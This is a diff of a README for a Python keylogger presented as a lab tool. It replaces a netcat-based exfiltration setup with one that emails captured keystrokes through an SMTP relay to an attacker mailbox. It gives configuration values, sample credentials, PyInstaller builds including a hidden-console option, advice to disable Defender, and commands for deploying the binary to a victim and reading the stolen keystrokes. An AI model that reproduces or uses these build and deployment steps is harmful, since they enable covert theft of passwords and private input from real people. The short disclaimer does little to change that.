@@ -1,97 +1,113 @@
-# Network Keystroke Monitor (Lab Edition)
+# SMTP Keystroke Monitor (Lab Edition)
 
-A standalone keystroke logger designed for **cybersecurity lab simulations**. It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.
+A multi-threaded keystroke logger that uses SMTP to exfiltrate captured keystrokes via email. Designed for network security lab simulations with DMZ-based email relay infrastructure.
 
----
+## 🏗️ Network Topology
 
-## ⚙️ Configuration
-
-Edit the attacker IP before building:
-
-```bash
-nano src/main.py
+```
+┌──────────────┐       ┌──────────────┐       ┌──────────────┐
+│  LAN         │       │     DMZ      │       │     WAN      │
+│  Victim PC   │──────▶│  SMTP Relay  │──────▶│  Attacker    │
+│ 192.168.x.x  │       │  172.16.0.5  │       │  Mail Server │
+└──────────────┘       └──────────────┘       └──────────────┘
 ```
 
-Change:
+**Data Flow:**
+1. Victim machine captures keystrokes (LAN)
+2. Buffered keystrokes sent via SMTP to DMZ relay (172.16.0.5:587)
+3. DMZ relay forwards emails to attacker's mailbox (WAN)
+
+## ⚙️ SMTP Configuration
+
+Before building, configure SMTP settings in `src/main.py`:
 
 ```python
-KALI_IP = "192.168.X.X"
+SMTP_SERVER = "172.16.0.5"          # DMZ SMTP relay IP
+SMTP_PORT = 587                     # STARTTLS port
+SENDER_EMAIL = "attacker@dmz.local" # Sender address
+SENDER_PASSWORD = "password123"     # SMTP credentials
+RECEIVER_EMAIL = "attacker@dmz.local" # Recipient address
+BUFFER_SIZE = 100                   # Max keystrokes per email
+SEND_INTERVAL = 60                  # Seconds between sends
 ```
-
-Replace it with your **Kali Linux IP**.
-
----
 
 ## 🛠️ Build Instructions
 
-### Linux
-
+### Prerequisites
 ```bash
 pip install pynput pyinstaller
+```
+
+### Generate Standalone Binary
+```bash
+# Clean build with all source paths
 pyinstaller --onefile --clean --paths=src src/main.py
+
+# Output: dist/main (or dist/main.exe on Windows)
 ```
 
-Output: `dist/main`
+### Build Options
+- `--onefile`: Single executable bundle
+- `--noconsole`: Hide console window (Windows)
+- `--hidden-import`: Add imports if needed
 
----
+## 🧪 Lab Simulation Steps
 
-### Windows 🪟
-
-Run on a **Windows machine** (PowerShell or CMD):
-
-```powershell
-pip install pynput pyinstaller
-pyinstaller --onefile --noconsole --clean --paths=src src/main.py
-```
-
-Output: `dist/main.exe`  
-`--noconsole` hides the terminal window on Windows.
-
----
-
-## 🧪 Lab Simulation – How to Run
-
-### Lab Setup
-- Attacker: Kali Linux
-- Victim: Windows / Linux
-- Port: 4444
-
-### Step 1: Attacker (Kali)
-
+### 1. Setup DMZ SMTP Relay
 ```bash
-nc -lvp 4444
+# Install Postfix on DMZ machine (172.16.0.5)
+sudo apt update && sudo apt install postfix
+
+# Configure as relay with authentication
+sudo dpkg-reconfigure postfix
+
+# Create test user
+sudo useradd -m attacker
+echo "attacker:password123" | sudo chpasswd
+
+# Enable STARTTLS on port 587
+sudo postconf -e 'smtpd_tls_security_level=may'
+sudo systemctl restart postfix
 ```
 
-### Step 2: Transfer Binary to Victim
-
+### 2. Deploy to Victim Machine
 ```bash
-scp dist/main user@VICTIM_IP:/home/user/
-```
+# Transfer binary to victim (LAN)
+scp dist/main victim@192.168.x.x:/tmp/
 
-### Step 3: Execution
-
-Linux victim:
-
-```bash
-chmod +x main
+# Execute on victim
 ./main
 ```
 
-Windows victim:
+### 3. Monitor Attacker Mailbox
+```bash
+# Check mail on attacker's server
+mail -u attacker
 
-Double‑click `main.exe` (disable Defender for lab testing).
+# Or monitor DMZ relay logs
+sudo tail -f /var/log/mail.log
+```
 
----
+### 4. Graceful Shutdown
+```bash
+# Send SIGTERM for clean exit (flushes buffer)
+kill -TERM <pid>
 
-## 🛡️ Features
+# Or SIGINT (Ctrl+C)
+kill -INT <pid>
+```
 
-- Cross‑platform (Linux & Windows)
-- Standalone executable (no Python required)
-- Stealth execution on Windows
-- Clean keystroke stream
+## 🔧 Architecture
 
----
+### Multi-Threading Design
+- **Queue Thread**: Captures keystrokes and adds to queue
+- **Buffer Thread**: Dequeues keystrokes and builds email buffer
+- **Sender Thread**: Periodically sends buffered data via SMTP
 
-## ⚠️ Disclaimer
+### Signal Handlers
+- `SIGINT` / `SIGTERM`: Graceful shutdown with buffer flush
+- Ensures no keystroke data is lost on exit
 
-For **authorized educational cybersecurity lab use only**. Do **NOT** use on real systems or real users.
+## ⚠️ Legal Disclaimer
+
+This tool is designed **exclusively for authorized security testing and educational purposes** in controlled lab environments. Unauthorized keystroke logging is illegal. Use responsibly.
